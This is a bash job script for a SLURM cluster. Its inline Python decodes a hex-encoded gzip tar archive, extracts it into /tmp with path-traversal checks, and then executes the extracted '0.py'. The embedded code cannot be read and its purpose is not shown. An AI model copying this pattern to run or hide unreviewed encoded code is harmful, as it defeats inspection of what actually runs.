#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95cf6fdb2014c77bf65f8172b12d4504e3dfa972dc7d876d97a9aab0818434c11690b5d9b4ff7d604755a64abbb5ddb4f7391863f3be0fdee301c17b3be89b5785782a42a696bc6c499e17cfeff3f7aaaeea1b445e775a3327eb98f12edfc2d75fc88f851b1e845eacd1827524a379515675d32e966831b2f36160fcdeee182dab3082f7a5cc645614b4a794cb4e76bc69eaaa12a2cbca92c99ac8aecadaaa936d97cbae6cdb863494b6b4e4a4948c5dab766727ac172d8bacc96a12fe1c98be724609a305e938cd48c168c7f35e522a38694b5ad19cf5a41225e77dd3d67dd97326dbb664bdf75d6735cf9ba25dfc7cefd8fe0b103c9e5fddc79feb3fcbb217f55f1439d4ff5ba08ee3601cb267bb0c17c172c7eceea0baa50f8a54071149331cd1c85cf8882e833ffa6e6436a149bc216666fbed6b7697def69ba081437ddb2431ab984cb74b9c62237cc93bf1e492348dd86c1aaf4633ec45ef56fd703c9eb472e7d57e7f1627bd8dd355ff359e4ea6f82ec8b8edf73862d60aeffe32453c1f15099bc5a7f3c4abe39d78e26a2bac77b5d97895df8fb1f82e7a546e872eebc3c32874c252c42c72eb08c9c12081949e3a4849a4078704d6ec2870d828ce06eb241e4cbf6386dfef32b28ad3753f68a7f4495cdb281b1c2429f29231c671509dd63dcba5780c726bc39415e80b3b9cc407630693c49fb565324c623cb938f592e3c687728c57b3e1ed182c8576f8f8c09549e68edd7c3227b1144fcabafbe161eaa57ee8a3514e5c82e3b04f8061bd9b2626e6ac84848424861c63a5438413b2b4ce249353ff77da02570bc6fbe1792b1c99d2517824268dde7b2f03000000000000000000000000000000000000000000c0ffca2f03519c8900280000')
r=Path('/tmp')/('a'+j+'ab0123456789')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
